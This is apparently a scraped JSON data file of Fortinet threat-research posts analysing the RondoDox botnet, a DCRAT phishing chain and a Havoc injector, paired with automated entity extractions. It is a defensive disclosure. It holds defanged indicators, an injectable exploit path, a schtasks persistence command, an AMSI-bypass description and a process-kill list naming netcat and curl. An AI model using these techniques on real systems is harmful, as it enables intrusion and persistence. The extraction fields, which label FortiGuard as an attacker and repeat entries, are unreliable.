LNK/Agent.ALC!trVBS/Dropper.B!trMSIL/Agent.FFF!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (Content Disarm and Reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule:FCF Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. secfileshare[.]comkpuszkiev[.]com 2102c2178000f8c63d01fd9199400885d1449501337c4f9f51b7e444aa6fbf50e07b33b5560bbef2e4ae055a062fdf5b6a7e5b097283a77a0ec87edb7a3547253f3e367d673cac778f3f562d0792e4829a919766460ae948ab2594d922a0edae f8403e30dd495561dc0674a3b1aedaea5d6839808428069d98e30e19bd6dc045fbffe681c61f9bba4c7abcb6e8fe09ef4d28166a10bfeb73281f874d84f69b3d39c68962a6b0963b56085a0f1a2af25c7974a167b650cf99eb1acd433ecb772b9d1f587b1bd2cce1a14a1423a77eb746d126e1982a0a794f6b870a2d7178bd2c7b2b757e09fa36f817568787f9eae8ca732dd372853bf13ea50649dbb62f0c5b f4f6beea11f21a053d27d719dab711a482ba0e2e42d160cefdbdad7a958b93d0 Cara Lin FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Entity), (Microsoft Windows, Tool), (NordDragonScan, Malware), (kpuszkiev.com, Domain), (hxxps://cutt[.]ly/4rnmskDe, URL), (hxxps://secfileshare[.]com, URL), (Укрспецзв_Акт_30_05_25_ДР25_2313_13 від 26_02_2025.rar, File), (Ukrspetszv_Act_30_05_25_DR25_2313_13 dated 26_02_2025, File), (mshta.exe, Tool), (mshta.exe, Tool), (mshta.exe, Tool), (mshta.exe, Tool), (mshta.exe, Tool), (mshta.exe, Tool), (mshta.exe, Tool), (mshta.exe, Tool), (mshta.exe, Tool), (mshta.exe, Tool), (mshta.exe, Tool), (mshta.exe, Tool), (mshta.exe, Tool), (mshta.exe, Tool), (mshta.exe, Tool), (mshta.exe, Tool), (mshta.exe, Tool), (mshta.exe, Tool), (mshta.exe, Tool), (mshta.exe",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Entity"
        ],
        [
          "Microsoft Windows",
          "Tool"
        ],
        [
          "NordDragonScan",
          "Malware"
        ],
        [
          "kpuszkiev.com",
          "Domain"
        ],
        [
          "hxxps://cutt[.]ly/4rnmskDe",
          "URL"
        ],
        [
          "hxxps://secfileshare[.]com",
          "URL"
        ],
        [
          "Укрспецзв_Акт_30_05_25_ДР25_2313_13 від 26_02_2025.rar",
          "File"
        ],
        [
          "Ukrspetszv_Act_30_05_25_DR25_2313_13 dated 26_02_2025",
          "File"
        ],
        [
          "mshta.exe",
          "Tool"
        ],
        [
          "mshta.exe",
          "Tool"
        ],
        [
          "mshta.exe",
          "Tool"
        ],
        [
          "mshta.exe",
          "Tool"
        ],
        [
          "mshta.exe",
          "Tool"
        ],
        [
          "mshta.exe",
          "Tool"
        ],
        [
          "mshta.exe",
          "Tool"
        ],
        [
          "mshta.exe",
          "Tool"
        ],
        [
          "mshta.exe",
          "Tool"
        ],
        [
          "mshta.exe",
          "Tool"
        ],
        [
          "mshta.exe",
          "Tool"
        ],
        [
          "mshta.exe",
          "Tool"
        ],
        [
          "mshta.exe",
          "Tool"
        ],
        [
          "mshta.exe",
          "Tool"
        ],
        [
          "mshta.exe",
          "Tool"
        ],
        [
          "mshta.exe",
          "Tool"
        ],
        [
          "mshta.exe",
          "Tool"
        ],
        [
          "mshta.exe",
          "Tool"
        ],
        [
          "mshta.exe",
          "Tool"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 27,
    "relationship_count": 0
  },
  {
    "title": "RondoDox Unveiled: Breaking Down a New Botnet Threat",
    "link": "https://www.fortinet.com/blog/threat-research/rondobox-unveiled-breaking-down-a-botnet-threat",
    "content": "FortiGuard Labs Threat Research A new botnet built for evasion and disruption Affected Platforms:TBK DVR-4104. TBK DVR-4216. Four-Faith router models F3x24. Four-Faith router models F3x36.Impacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High Over the past month, FortiGuard Labs has observed a significant increase in scanning activity, including a new botnet campaign that exploits two high-risk vulnerabilities:CVE-2024-3721andCVE-2024-12856. Both have been publicly disclosed and are actively being targeted, posing serious risks to device security and overall network integrity. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The botnet responsible for these attacks has been namedRondoDox. Unlike widespread variants such as Mirai or Gafgyt, RondoDox is a relatively new and low-profile threat. FortiGuard Labs first identified a similar ELF binary in September 2024. Notably, RondoDox incorporates custom libraries and mimics traffic from gaming platforms or VPN servers to evade detection. CVE-2024-3721is a critical vulnerability affecting TBK DVR models, including DVR-4104 and DVR-4216, as of April 12, 2024. The flaw stems from improper handling of the /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___ path, where the mdb and mdc parameters can be manipulated to inject OS commands. Successful exploitation allows remote attackers to execute arbitrary commands on affected devices. CVE-2024-12856impacts Four-Faith router models F3x24 and F3x36. The vulnerability allows authenticated remote attackers to execute arbitrary operating system commands via HTTP by exploiting the apply.cgi interface when modifying the system time. RondoDox was initially distributed to target Linux-based operating systems running on ARM and MIPS architectures. However, recent findings show the emergence of a shell script downloader that suggests the malware is now capable of targeting a broader range of Linux architectures, including Intel 80386, MC68000, MIPS R3000, PowerPC, SuperH, ARCompact, x86-64, and AArch64. The shell script begins by instructing the victim host to ignore several signals, including SIGTTOU, SIGTTIN, SIGTSTP, SIGHUP, SIGPIPE, SIGINT, SIGQUIT, and SIGTERM. It then checks for writable paths such as /dev, /dev/shm, the victim user’s home directory, /mnt, /run/user/0, /var/log, /var/run, /var/tmp, and /data/local/tmp, verifying if any are mounted without the noexec flag as listed in /proc/mounts. Finally, it creates a lib directory inside /tmp, downloads and executes the “RondoDox” malware, and clears the command execution history to evade detection. The following analysis focuses on the x86-64 architecture binary named rondo.x86_64. The RondoDox malware encodes its configuration data using a simple XOR obfuscation algorithm. This includes elements such as file paths and tool filenames. All encoded values can be decrypted using the hexadecimal key 0x21. After decoding its configuration data, RondoDox implements a persistence mechanism to maintain its presence on the victim host. RondoDox modifies file permissions and symbolic links to establish persistence. As shown in Figure 6, the XOR-encoded values byte_51D670 and byte_51D6C0 decode to /etc/init.d/rondo and /etc/rc3.d/S99rondo, respectively. Additionally, the malware embeds a shell script designed to execute its persistence routines on the victim system. In addition to using init scripts, RondoDox appends its launch command to several system startup files, including /etc/rcS, /etc/init.d/rcS, and /etc/inittab, as well as to both user and root crontab entries. This layered persistence strategy ensures that even if one method is removed or disabled, others remain active to automatically reinstate the botnet upon system reboot. Upon execution, RondoDox retrieves its own process ID and scans the system for specific applications. It looks for keywords associated with network utilities (such as wget and curl), system analysis tools (like Wireshark and gdb), or other malware (e.g., cryptominers or Redtail variants). If any such processes are detected, RondoDox immediately terminates them to evade analysis and maintain operational stealth. dhpcd apcid redtail xmrig miner ps top htop pstree lsof netstat ss wireshark tshark ngrep dumpcap tcpdump passwd chpasswd iptables nc netcat ufw gdb gdbserver cgdb strace valgrind stap dtrace sysdig bpftrace scp shutdown poweroff halt reboot During analysis of RondoDox, we noticed that the malware writes the email address vanillabotnet@protonmail[.]com to the file tmp/contact.txt. However, no further use of this address has been observed within the malware’s execution flow or command logic. Next, RondoDox scans several common Linux executable directories, including: It then renames selected executable files to hardcoded strings of random characters. This action is intended to disrupt critical system functions, including firewall configuration, user account management, and shutdown operations. By corrupting these binaries, the malware impairs system stability and complicates recovery efforts. Original File Name Modified File Name Iptables jsuJpf ufw nqqbsc passwd ahwdze chpasswd ereghx shutdown hhrqwk poweroff dcwkkb halt cjtzgw reboot gaajct After completing its setup routines, RondoDox decodes its command-and-control (C2) server address—83[.]150[.]218[.]93—using the key \"rondo\", and then initiates a connection to the server. The malware receives commands from its C2 server for subsequent DDoS attacks. RondoDox is capable of launching distributed denial-of-service (DDoS) attacks using three primary protocols: HTTP, UDP, and TCP. To evade detection, it disguises malicious traffic by emulating popular games and platforms such as Valve, Minecraft, Dark and Darker, Roblox, DayZ, Fortnite, GTA, as well as tools like Discord, OpenVPN, WireGuard, and RakNet. For example, when RondoDox receives a command from its C2 server to attack a specific target while impersonating OpenVPN traffic, it crafts packet payloads that include the OpenVPN \"magic byte,\" which begins with \\x38, as shown in Figure 17. Beyond gaming and chat protocols, RondoDox can also mimic custom traffic from tunneling and real-time communication services, including WireGuard, OpenVPN variants (e.g., openvpnauth, openvpncrypt, openvpntcp), STUN, DTLS, and RTC. By impersonating these legitimate services, the malware significantly increases the difficulty for defenders in effectively identifying and blocking its traffic. RondoDox is a sophisticated and emerging malware threat that employs advanced evasion techniques, including anti-analysis measures, XOR-encoded configuration data, custom-built libraries, and a robust persistence mechanism. These capabilities allow it to remain undetected and maintain long-term access on compromised systems. The malware primarily exploits two known vulnerabilities—CVE-2024-3721andCVE-2024-12856—highlighting the critical need for timely patching of affected systems. Its use of obfuscation, service mimicry, and multi-layered persistence underscores its growing threat potential. Ongoing monitoring, threat intelligence sharing, and in-depth behavioral analysis are crucial for comprehending the full extent of RondoDox and for developing effective detection and mitigation strategies. The malware described in this report is detected and blocked byFortiGuard Antivirusas: BASH/RondoDox.A!tr.dldrELF/RondoDox.CTO!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 server. FortiGuard Labs provides an IPS signature against attacks exploiting the following vulnerabilities: CVE-2024-3721: TBK.DVR.SOSTREAMAX.Command.InjectionCVE-2024-12856: Four-Faith.Routers.adj_time_year.Command.Injection We also suggest that organizations consider completingFortinet’s free trainingmodule,Fortinet Certified Fundamentals(FCF) in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 45[.]135[.]194[.]3483[.]150[.]218[.]9314[.]103[.]145[.]20214[.]103[.]145[.]211154[.]91[.]254[.]9578[.]153[.]149[.]90 Downloader c88f60dbae08519f2f81bb8efa7e6016c6770e66e58d77ab6384069a515e451ceb3e2a6a50f029fc646e2c3483157ab112f4f017406c3aabedaae0c94e0969f6f4cd7ab04b1744babef19d147124bfc0e9e90d557408cc2d652d7192df61bda9 RondoDox e3c080e322862d065649c468d20f620c3670d841c30c3fe5385e37f4f10172e7e62df17150fcb7fea32ff459ef47cdd452a21269efe9252bde70377fd2717c1053e2c2d83813d1284ddb8c68b1572b17cca95cfc36a55a7517bf45ff40828be543d4847bf237c445ed2e846a106e1f55abefef5c3a8545bd5e4cad20f5deb9a44c2429fc8b8ec61da41cbba1b8184ec45fa93a9841b4ca48094bba7741b826b8694d729d67f1b0c06702490bfab1df3a96fe040fe5d07efa5c92356c329757beedae3b75deb8013bd48ac4534cca345b90938a2abb91672467c2bf9ae81ff6830814a0781ab30fca069a085dba201d6fd0f414498fafa4bb42859786d91d478159b4deee977e9e27b60e7e179d54a1ce8e56624e73b799523416eee828bfaf769f916a552efc6775367a31357a633dc0be01879830d3fddccdf3c40b26e50afd0a9ebbecc8ec58c253039520304ca373cfb8d1674d67993e6485e244a77d6ec96c81fd73b4bef6fef379cbefdcce7f374ea7e6bf1bf0917cf4ca7b72d4cee788a55a3859a203ca2bae7399295f92aeae61d845ffa173c1938f938f5c148eef9957573779f9a62eecb80737d41d42165af8bb9884579c50736766abb63d2835ba3daa53204978b7797bd53f5c964eed7a73d971517a764785ce3ab65a9423c2e78bf8928bc255e73e0b5b0ce13747c64d82d5f2647da129f189138773733ac21f20a24b179bdbbdcc0053838c0484ea25eff6976f2b8cb5630ab4efb28b0f06b542aa715573c7d2fca01914504cb7336db715d73d1e20d23e4bd37f2e4f4fe389c9278ce988343606350a94156ca28ee28bd605d1d95c810a16866eee1f997598a197f60d5f5641f2c56576b4c867d141612c6e00db29c512f266835510b8a62d8250d289c5ec87752cec1af31eed0347cf2dd54dc0fbeea645319c4dae238ee2d02414a54e97ad26748812002610f1491a2a746e9ba0f9d05de3d47d7bab4f5ec123a91fdacd9a4c0bcf800d6b7db5162cfd11cb71e260647ef0f2c60978ebfcef708fec1afbea4fb32b586e0dacf0d228c375a532008d81453c367256afea5a305507f34c14c72cab35715b7f7b25b32352a8e19b8a283003aaf539d12ca517937e6ab0dfcedfa23eced7b52d3899b0847df3fcb7a9c326b71027a7ab5f5b93 botnets,botnet FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (botnet, Threat Type), (TBK DVR-4104, Platform), (TBK DVR-4216, Platform), (Four-Faith router model, Device), (F3x24, Device), (F3x36, Device), (RondoDox, Attacker), (CVE-2024-3721, Vulnerability), (April 12, 2024, Date), (critical, Severity)\nRelationships: (FortiGuard Labs, publishes, 2025 Global Threat Landscape Report), (FortiGuard Labs, identifies, similar ELF binary), (FortiGuard Labs, observes, scanning activity), (FortiGuard Labs, detects, CVE-2024-3721), (FortiGuard Labs, discovers, RondoDox), (FortiGuard Labs, analyzes, CVE-2024-3721), (FortiGuard Labs, reports, RondoDox)",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "botnet",
          "Threat Type"
        ],
        [
          "TBK DVR-4104",
          "Platform"
        ],
        [
          "TBK DVR-4216",
          "Platform"
        ],
        [
          "Four-Faith router model",
          "Device"
        ],
        [
          "F3x24",
          "Device"
        ],
        [
          "F3x36",
          "Device"
        ],
        [
          "RondoDox",
          "Attacker"
        ],
        [
          "CVE-2024-3721",
          "Vulnerability"
        ],
        [
          "April 12",
          "2024",
          "Date"
        ],
        [
          "critical",
          "Severity"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "publishes",
          "2025 Global Threat Landscape Report"
        ],
        [
          "FortiGuard Labs",
          "identifies",
          "similar ELF binary"
        ],
        [
          "FortiGuard Labs",
          "observes",
          "scanning activity"
        ],
        [
          "FortiGuard Labs",
          "detects",
          "CVE-2024-3721"
        ],
        [
          "FortiGuard Labs",
          "discovers",
          "RondoDox"
        ],
        [
          "FortiGuard Labs",
          "analyzes",
          "CVE-2024-3721"
        ],
        [
          "FortiGuard Labs",
          "reports",
          "RondoDox"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 11,
    "relationship_count": 7
  },
  {
    "title": "DCRAT Impersonating the Colombian Government",
    "link": "https://www.fortinet.com/blog/threat-research/dcrat-impersonating-the-columbian-government",
    "content": "FortiGuard Labs Threat Research Multi-layered obfuscation used to deploy remote access trojan Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Control and collect victim’s sensitive information from the victim’s devicePrevalence:Columbia targetedSeverity Level:High The FortiMail IR team recently uncovered a new email attack distributing a Remote Access Trojan called DCRAT. The threat actor is impersonating a Colombian government entity to target organizations in Colombia. The threat actor uses multiple techniques, such as a password protected archive, obfuscation, steganography, base64 encoding, and multiple file drops, to evade detection. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. 1. Modular ArchitectureDCRAT is designed with a modular structure, allowing attackers to add or remove plugins. This lets them tailor the RAT’s behavior to specific tasks like data theft, surveillance, or persistence. 2. Comprehensive Surveillance CapabilitiesThe RAT allows remote control over infected systems. Attackers can execute commands, manage files, monitor user activity, and even download or run additional malicious payloads. 3. Information TheftIt can steal sensitive information such as credentials, documents, browser data, and personal files. It also supports screenshot capture and keylogging to record user input. 4. System ManipulationDCRAT can alter system settings — rebooting, shutting down, logging off users, or creating new accounts. It can also change visual elements like wallpapers and taskbar visibility. 5. File and Process ManagementThe malware supports creating, deleting, renaming, or moving files and folders. It can run or terminate processes and upload/download files to or from the victim’s system. 6. Browser and Credential HarvestingIt specifically targets browsers to extract stored data such as cookies, browsing history, and saved login credentials. It can also open websites and perform actions in the user’s browser. The threat actor sends an email impersonating a Colombian government entity to trick the user to run the attachment contents while having the recipient in the BCC field: The ZIP attachment contains a bat file which will drop an obfuscated vbs file from a pastebin like website to C:\\Windows\\Temp: The vbs file is heavily obfuscated and is made to trick analysts and systems: After removing the junk and the obfuscation, we found the following, which eventually runs the base64 variable: The base64 code in the first variable contained another script: Cleaning the above script reveals the following: This script sets a reversed URL as a variable and points it to an image which contains data hidden with base64. Unfortunately, the URL can’t be reversed and the image payload is no longer available. But due to the presence of the URL, which contains an exe file in base64 and the contents of the code itself, it is safe to assume it would extract the image data and invoke a .NET library to download thethird and final payload from the reversed URL to C:\\Users\\Public\\Downloads: The base64 string in the reversed URL contains the RAT exe file. Looking at the main function, we see multiple calls: It starts with a small delay, and then goes into InitializeSettings, which will decrypt settings encrypted with AES256. The AES256 key is hardcoded and is in base 64: Variables revealed after the decryption: Ports– 8848Hosts- 176.]65.]144.]19Version– 1.0.7Install– falseMTX– DcRatMutex_qwqdanchunPastebin– nullAnti– falseAnti_Process– falseBS_OD– falseGroup– AUHWID– This takes the properties of the machine, concatenates them, converts that into an MD5 hash, and then converts that hash into a hexadecimal string. It then takes the first 20 characters and converts them into upper case. Server signature – iHIVV6dj49xn32TizMB3V5F6bAZIlmMWQuHKEN0CBcWc9Ig0HTq78LVe/AKhThRcQR7wOt/8i61T7NkoN+CPhQ8311QUiU2j4NTTO3B/f3ifVSB2vTGJgrF19iqrqUwK8NKkJnHR+29/ec7pz4lMhwJSOhYYj0ZB9BtUYMUzsic= Server certificate - MIICMDCCAZmgAwIBAgIVAJdJTOcvv+RE0UKkRJdxy6sUSIJ9MA0GCSqGSIb3DQEBDQUAMGQxFTATBgNVBAMMDERjUmF0IFNlcnZlcjETMBEGA1UECwwKcXdxZGFuY2h1bjEcMBoGA1UECgwTRGNSYXQgQnkgcXdxZGFuY2h1bjELMAkGA1UEBwwCU0gxCzAJBgNVBAYTAkNOMB4XDTI0MDYyNjE0MzcyN1oXDTM1MDQwNTE0MzcyN1owEDEOMAwGA1UEAwwFRGNSYXQwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAKBWZ41Q3CUr6D9fGM31TTe3ObXCDtWIxyuls5ZxROJrzVNlVm5Mb2zSE/543JczTUE94b3YzFPMUMJJ3SB7vpO7L4lMe0W+JlZClj/00M3J6b7a4bB4/c/BVrO3O5RMGNlMSCy68zX8roxt0SFUdlB2L6JJ2xEuaVv/9bdejAK7AgMBAAGjMjAwMB0GA1UdDgQWBBSKoz4PgqFtf1/VImq3jWW0Pxsu5zAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBDQUAA4GBAIrcEfDtCf8noEqBq9iAkPXXTNhGZ3YgwxGfvgWCAGSrWcEdOs2tWJ4Vx1EgAy6SZ6tJq6soFYOJohwV4S22WVnoQzzPgB759pR36AP0zFjxEhhci0wTHQuP8wRW8oTOCsQxjjHrFFBCqHLTq4Wc59cWbLwuTSBSTgqM0u1iOvO9 After initializing those settings, it runs VerifyHash, which checks if the signature is valid for that hash and public key. Following the main function, if Anti had been TRUE, it would run the following anti analysis function: This runs a query that selects everything from Win32_CacheMemory and iterates through each one. Win32_CacheMemory provides info about cache memory devices. If there are none, it could indicate the presence of a VM. Following the next call, it creates a mutex with the mutex name previously decrypted and saved into MTX. (DcRatMutex_qwqdanchun) If the Anti Process were true, it would run a code that would constantly check for the processes mentioned in it and terminate them if detected: After the next call, if BS_OD (i.e., Blue Screen of Death) was set to true and the user had administrative privileges, the code would attempt to mark the malware process as a critical system process using RtlSetProcessIsCritical. Terminating such a process would trigger a blue screen of death. Following the next call, if In_stall were true, it would run through a few blocks of code under Install(). This code block uses FileInfo to retrieve properties of the Install_Folder variable, which in this case points to the AppData\\Roaming directory. It then obtains the full file path of the currently running malware and compares it to the Install_Folder path. If the paths do not match, it iterates through all running processes and terminates any that are executing from the Install_Folder location. If the user has administrative privileges, the malware spawns a hidden cmd process to execute a base64-decoded command string: /c schtasks /create /f /sc onlogon /rl highest /tn It then appends parameters to register the malware binary as a scheduled task for persistence. The final command executed is: /c schtasks /create /f /sc onlogon /rl highest /tn \"TASK NAME\" /tr \"\\\"FULL PATH OF THE EXECUTABLE\\\"\" & exit If the user lacks administrative privileges, the malware instead creates a registry entry under: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ The entry uses the malware’s filename and path to ensure it is executed at user logon. After completing the previous steps, the malware checks whether the file still exists at the path specified by FullName (i.e., the full path of the currently running executable) and pauses execution for one second. It then creates a new file in the AppData\\Roaming directory and copies the current executable into that location. Next, it generates a .bat file in the AppData\\Local\\Temp directory containing a script designed to execute the dropped file and then delete itself. The contents of the batch file are as follows: @echo offtimeout 3 > NULSTART \"\" \"DROPPED FILE LOCATION\"CD xxx\\AppData\\Local\\Temp\\DEL \"BAT FILE NAME\" /he flags: This function instructs Windows to keep the display on and prevent the system from entering sleep mode, maintaining this state continuously until explicitly reset. It uses the value 2147483651U, which corresponds to 0x80000003 in hexadecimal. According to Microsoft’s documentation for SetThreadExecutionState (a function imported from kernel32.dll), this value is a combination of the following flags: Combined, these flags ensure that the system remains active and the screen remains on without interruption. The RAT then checks to see if the user is an admin. If so, it runs the CleanSetting function: This function performs the following: The RAT then calls for the Amsi.Bypass function The function receives two base64-encoded strings and determines whether the current process is running in 32-bit or 64-bit mode. It then passes this architecture-specific value as a byte to the PatchA function. Inside PatchA, the function decodes two base64 strings: \"amsi.dll\" and \"AmsiScanBuffer\". AmsiScanBuffer is a function provided by the Windows Antimalware Scan Interface (AMSI), available in Windows 10 and later. AMSI allows applications to pass memory buffers to the system’s antivirus engine for scanning. The function proceeds to load amsi.dll into memory and retrieves the address of the AmsiScanBuffer function. It then attempts to inject a patch into this memory location, with the goal of sabotaging or disabling AMSI’s ability to detect malicious code. Finally, the RAT enters an infinite loop, continuously attempting to connect to its command-and-control (C2) server. In this case, the C2 address was hardcoded, as noted earlier. However, the RAT also supports retrieving the C2 address dynamically from a remote URL stored in the Paste_bin variable. The attacker sends a phishing email impersonating a Colombian government agency to deceive the user into executing a malicious file. To evade detection, the attack chain employs multiple obfuscation techniques, including steganography and multi-stage payloads. When the file is run, it downloads an obfuscated VBS script from a text-sharing site. This script, in turn, executes obfuscated PowerShell code that retrieves a second link from another sharing site. It then extracts and invokes a .NET library embedded within an image file using steganography to deliver and execute the final payload. The impact of such an attack is severe: giving a threat actor direct access to a victim’s machine can result in the theft of sensitive data, system compromise, and significant operational or financial damage. FortiMail dynamically detects the email, the BAT file, and the VBS file as malware. FortMail also detects the files statically based on the system’s advanced threat engines and previous threat intelligence research. The malware described in this report is detected and blocked byFortiGuard Antivirusas: MSIL/Agent.CFQ!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (Content Disarm and Reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule:FCF Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. URLs: hxxp[:]//paste[.]ee/d/jYHEqBJ3/0hxxps[:]//paste[.]ee/d/oAqRiS3ghxxps[:]//ia601205[.]us[.]archive[.]org/26/items/new_image_20250430/new_image[.]jpg ZIP:db21cc64fb7a7ed9075c96600b7e7e7007a0df7cb837189c6551010a6f828590BAT:34b8040d3dad4bd9f34738fbc3363fcda819ac479db8497fb857865cee77ad89VBS:b0f3c7ea17875b5e1545678b3878ce268ff4bde718b66254ce01b0bb864801b8EXE:77a22e30e4cc900379fd4b04c707d2dfd174858c8e1ee3f1cbecd4ece1fab3feC2:176[.]65[.]144[.]19[:]8848 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Attacker), (Remote Access Trojan, Malware), (DCRAT, Malware), (Modular Architecture, Technique), (Comprehensive Surveillance Capabilities, Technique), (Information Theft, Technique), (Syste, Technique)\\nRelationships: (FortiGuard Labs Threat Research, uses, Remote Access Trojan), (FortiGuard Labs Threat Research, uses, DCRAT), (DCRAT, contains, Modular Architecture), (DCRAT, contains, Comprehensive Surveillance Capabilities), (DCRAT, contains, Information Theft), (DCRAT, contains, Sys)",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Attacker"
        ],
        [
          "Remote Access Trojan",
          "Malware"
        ],
        [
          "DCRAT",
          "Malware"
        ],
        [
          "Modular Architecture",
          "Technique"
        ],
        [
          "Comprehensive Surveillance Capabilities",
          "Technique"
        ],
        [
          "Information Theft",
          "Technique"
        ],
        [
          "Syste",
          "Technique"
        ],
        [
          "FortiGuard Labs Threat Research",
          "uses",
          "Remote Access Trojan"
        ],
        [
          "FortiGuard Labs Threat Research",
          "uses",
          "DCRAT"
        ],
        [
          "DCRAT",
          "contains",
          "Modular Architecture"
        ],
        [
          "DCRAT",
          "contains",
          "Comprehensive Surveillance Capabilities"
        ],
        [
          "DCRAT",
          "contains",
          "Information Theft"
        ],
        [
          "DCRAT",
          "contains",
          "Sys"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 13,
    "relationship_count": 0
  },
  {
    "title": "Dissecting a Malicious Havoc Sample",
    "link": "https://www.fortinet.com/blog/threat-research/dissecting-a-malicious-havoc-sample",
    "content": "FortiGuard Labs Threat Research A Follow-Up to “Intrusion into Middle East Critical National Infrastructure Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully remotely control the compromised computerSeverity level:High This analysis is a follow-up to the investigation titled ‘Intrusion into Middle East Critical National Infrastructure’(full reporthere), led by the FortiGuard Incident Response Team (FGIR), which investigated a long-term cyber intrusion targeting critical national infrastructure (CNI) in the Middle East. That report revealed that the attacker added several pieces of malware to the system’s Task Scheduler to maintain persistence. In this report, we conduct a detailed analysis of one of the malicious Havoc variant samples. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Havoc is a well-known post-exploitation command and control (C2) backdoor framework, primarily written in C++ and Go. We describe how this Havoc variant is decrypted from a DLL file and then deployed in a newly created “cmd.exe” process, how the Havoc demon communicates with its C2 server, and what malicious actions it can perform on the compromised Windows system. The remote injector (conhost.exe) is launched by the system Task Scheduler using the following command line. C:\\Windows\\System32\\drivers\\conhost.exe -f conhost.dll -ER --ln --path cmd.exe Since the release of Windows 7, Windows OS has included conhost.exe (Console Window Host) to handle the command-line interface. The attacker disguised the remote injector as conhost.exe to mislead the victim. According to our analysis, the remote injector supports multiple features controlled by command-line parameters. The “conhost.dll” passed with the “-f” parameter contains the encrypted Havoc payload, and the “cmd.exe” specified by the “--path” parameter is the target process, into which Havoc will be injected and executed. When the fake conhost.exe is executed without any parameters, it displays its help information (Figure 1), which explains how to use the remote injector and its available options. Once the remote injector starts, it creates a “cmd.exe” process, specified by the “-- path” argument, by calling the API CreateProcessA(), as shown in Figure 2. The remote injector then decrypts a Havoc payload, referred to as the Havoc agent or demon within the Havoc framework, using a piece of shellcode embedded in the conhost.dll file. Figure 3 shows the decryption function in the remote injector, a portion of the decrypted shellcode, and the decrypted Havoc payload in the memory at the bottom of the debugger. The decryption key and IV are generated from the first 30H bytes of the conhost.dll file. Next, the remote injector calls two APIs, ZwAllocateVirtualMemory() and ZwWriteVirtualMemory(), using the ProcessHandle of the newly created “cmd.exe” process to inject the decrypted shellcode and Havoc executable into the process. Finally, the remote injector creates a remote thread by calling the ZwCreateThreadEx() API. The ProcessHandle parameter is again set to the newly created “cmd.exe” process, and its lpStartAddress parameter points to the address of the injected shellcode within the process. The purpose of shellcode is to deploy the subsequent Havoc payload (a DLL file) into the “cmd.exe” process and execute it. Havoc Framework is a typical RAT (Remote Access Trojan) and an open-source project available on GitHub. The Framework is written in multiple languages, including Golang, C, C++, Qt, Python, and Assembly (ASM). It was developed byC5piderand released in 2022. In Havoc, the Command and Control (C2) server is referred to as teamserver, while its UI dashboard, used to interact with teamserver, is referred to as the client. The Havoc agent, also known as a demon, runs on the compromised device to receive commands from the C2 server, allowing it to control the system. Figure 4 shows the Havoc client on the server side, where a demon is actively being connected and controlled. Havoc supports HTTP, HTTPS, and SMB protocols to transport commands and results between the C2 server and the compromised devices. In this sample, the C2 server is hardcoded as “apps[.]gist[.]githubapp[.]net.” Unfortunately, the server was unavailable during 